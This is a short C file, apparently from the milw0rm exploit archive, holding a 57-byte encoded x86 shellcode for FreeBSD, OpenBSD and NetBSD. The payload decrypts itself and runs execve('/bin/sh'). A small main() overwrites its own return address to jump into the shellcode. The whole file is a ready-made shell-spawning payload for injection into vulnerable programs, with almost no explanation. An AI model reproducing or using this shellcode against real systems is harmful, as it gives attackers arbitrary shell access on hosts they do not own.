/*
   *BSD version
   FreeBSD, OpenBSD, NetBSD.

   s0t4ipv6@shellcode.com.ar

   57 bytes.

   -Encriptado execve(/bin/sh);

   Para mas informacion ver
   http://www.shellcode.com.ar/es/proyectos.html
*/

char shellcode[]=
"\xeb\x1b\x5e\x31\xc0\x6a\x1a\x6a\x17\x59\x49\x5b\x8a\x04\x0e"
"\xf6\xd3\x30\xd8\x88\x04\x0e\x50\x85\xc9\x75\xef\xeb\x05\xe8"
"\xe0\xff\xff\xff\x0e\x6f\xc7\xf9\xbe\xa3\xe4\xff\xb8\xff\xb2"
"\xf4\x1f\x95\x4c\xfb\xf8\xfc\x1f\x74\x09\xb2\x65";

main()
{
   int *ret;
   printf("Shellcode lenght=%d\n",sizeof(shellcode));
   ret=(int*)&ret+2;
   (*ret)=(int)shellcode;
}

// milw0rm.com [2004-09-26]